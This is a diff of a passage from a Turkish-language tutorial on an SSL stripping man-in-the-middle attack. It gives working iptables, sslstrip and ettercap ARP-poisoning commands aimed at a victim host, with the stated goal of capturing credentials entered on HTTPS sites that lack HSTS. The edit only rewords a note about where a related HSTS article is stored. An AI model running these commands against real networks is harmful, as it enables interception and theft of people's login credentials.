@@ -19,7 +19,7 @@ HTTPS sitelerden gelen bilgileri okumak için ya ettercap içindeki bir plugin'i
 `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`<br/><br/>
 Sonra `sslstrip` diyerek sslstrip'i çalıştırıyoruz. Bir başka terminale geçip aşağıdaki komutu çalıştırıyoruz.<br/><br/>
 `ettercap -Tq -M arp:remote -S -i eth0 /192.168.10.1// /192.168.10.15//`<br/><br/>
-HTTP siteler için yaptığımız saldırıdaki komuttan farklı olarak -S ekledik. Eğer kurban HSTS olmayan, ama HTTPS kullanan bir sitede credentials girerse elimize düşecektir. Evet, maalesef HSTS varsa saldırımız işe yaramıyor. HSTS'in ne olduğu ve buna karşılık nasıl bir saldırı yapılabileceğini konu alan bir makale bu döküman ile birlikte paylaşılmıştır.<br/><br/>
+HTTP siteler için yaptığımız saldırıdaki komuttan farklı olarak -S ekledik. Eğer kurban HSTS olmayan, ama HTTPS kullanan bir sitede credentials girerse elimize düşecektir. Evet, maalesef HSTS varsa saldırımız işe yaramıyor. HSTS'in ne olduğu ve buna karşılık nasıl bir saldırı yapılabileceğini konu alan bir makale buldum, bu repoda bu döküman ile aynı dizin içine koydum.<br/><br/>
 İşimiz bittikten sonra aşağıdaki komut ile yaptığımız yönlendirmeleri kaldırabiliriz.<br/><br/>
 `iptables -t nat --flush`
 ### Ettercap ile DNS Saldırısı
